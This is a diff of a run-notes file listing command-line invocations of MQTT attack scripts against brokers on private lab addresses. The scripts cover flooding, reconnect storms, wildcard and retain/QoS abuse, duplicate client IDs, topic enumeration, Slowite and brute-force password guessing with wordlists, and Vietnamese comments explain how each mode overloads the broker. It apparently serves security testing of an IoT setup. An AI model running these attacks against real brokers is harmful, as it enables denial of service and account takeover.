@@ -1,17 +1,27 @@
-publish flood
-python .\attack_tls\publish_flood.py --broker 192.168.110.193 --port 8883 --username giamdoc --password admin123 --workers 5 --messages 1000 --delay 10  --ca .\certs\ca-cert.pem
-wildcard abuse
-python .\attack_tls\wildcard_abuse.py --broker 192.168.110.193 --port 8883 --username giamdoc --password admin123 --workers 2 --duration 60 --ca .\certs\ca-cert.pem
-topic_enum
-python .\attack_tls\topic_enumeration.py --broker 192.168.110.193 --port 8883  --workers 20 --user giamdoc --password 123 --ca .\certs\ca-cert.pem
-reconect_strom
-python .\attack_tls\reconnect_storm.py --broker 192.168.110.193 --port 8883   --workers 5 --reconnects 100 --username giamdoc --password 123   --ca .\certs\ca-cert.pem
-retain_qos(powershell)
-$topics = 1..500 | ForEach-Object { "factory/office/Device{0:D3}/telemetry" -f $_ }
->> python .\retain_qos_abuse.py --type mixed --broker 192.168.110.193 --port 8883 --workers 5 --messages 40 --delay 50 --topics $topics --username giamdoc --password 123 --ca .\certs\ca-cert.pem
-duplicate_id
-python .\attack_tls\duplicate_id.py --broker 192.168.110.193 --port 8883 --client-id production-production-sensorair1-replayer-replayer --type simultaneous --workers 5 --attempts 20 --delay 500 --username giamdoc --password 123 --ca .\certs\ca-cert.pem
-bruteforce_exploit
-python .\attack_tls\brute_force_exploit.py --broker 192.168.110.193 --port 8883 --target-username production-sensorflame1-replayer --ca .\certs\ca-cert.pem --tls --custom-passwords "123456" "password" "admin" "1234" "0000" "1111" "8888" "12345" "12345678" "123456789" "sensor123" "flamel123" "production123" "flame123" "sensor" "flamel" "production" "replayer" "sensorflamel" --delay 50 --workers 2 --min-length 7 --max-length 8
-slow
-python .\attack_tls\slow_brute_force.py --broker 10.12.112.191 --port 8883 --target-username production-sensorflame1-replayer --ca .\certs\ca-cert.pem --tls --custom-passwords "123456" "password" "admin" "1234" "0000" "1111" "8888" "12345" "12345678" "123456789" "sensor123" "production123"  "sensor" "flamel" "production" "replayer" "sensorflamel"  --min-length 7 --max-length 8 --packets-per-minute 4
+*Topic Enumiration 
+python Topic_Enumeration.py --broker 10.12.112.191 --port 8883 --username attacker --password 123
+*Bruce Force
+python Brute_Force.py --broker 10.12.112.191 --port 8883 --target-username "admin" --tls
+*Duplicate id
+python Duplicate_id.py --broker 10.12.112.191 --port 8883 --client-id "target_device " --username attacker --password 123
+*Flooding Dos
+python Flooding_Dos.py   --broker 10.12.112.191 --port 8883 --workers 10 --messages 2000 --topics "factory/sensor/temp"  --username attacker --password 123
+*Malformed Data
+python Malformed_Data.py --broker 10.12.112.191 --port 8883 --username attacker --password 123
+*Reconnect_Storm
+*Storm (Bão hỗn loạn): Giả lập mạng chập chờn bằng cách kết nối và ngắt kết nối ngẫu nhiên không đồng bộ để gây nhiễu loạn.
+python Reconnect_Storm.py --broker 10.12.112.191 --port 8883 --type storm --workers 10 --reconnects 100 --username attacker --password 123
+*Rapid (Tốc độ cao): Thực hiện chu trình kết nối rồi ngắt ngay lập tức với tốc độ nhanh nhất có thể để làm quá tải CPU (do xử lý TLS).
+python Reconnect_Storm.py --broker 10.12.112.191 --port 8883 --type rapid --workers 20 --duration 60 --username attacker --password 123
+*Burst (Dồn dập): Mở đồng loạt hàng loạt kết nối tại cùng một thời điểm (Thundering Herd) để đánh sập khả năng xử lý đồng thời của Broker.
+python Reconnect_Storm.py --broker 10.12.112.191 --port 8883 --type burst --workers 5 --burst-size 50 --num-bursts 20 --username attacker --password 123
+*Retain_Qos_Abuse
+ python Retain_qos_abuse.py --broker 10.12.112.191 --port 8883 --type mixed --username giamdoc --password 123
+ *Rotating Brute_Force
+ python Rotating_Brute_Force.py --broker 10.12.112.191 --port 8883 --target-username "admin" --tls
+*Slow
+python Slow_Brute_Force.py --broker 10.12.112.191 --port 8883 --target-username "admin" --tls
+*Slwit
+python Slowite.py --host 10.12.112.191 --port 8883 --clients 50 --zombie --tls --username attacker --password 123
+*Wildcarđ_Abuse
+python Wildcard_Abuse.py --broker 10.12.112.191 --port 8883 --workers 5 --username attacker --password 123
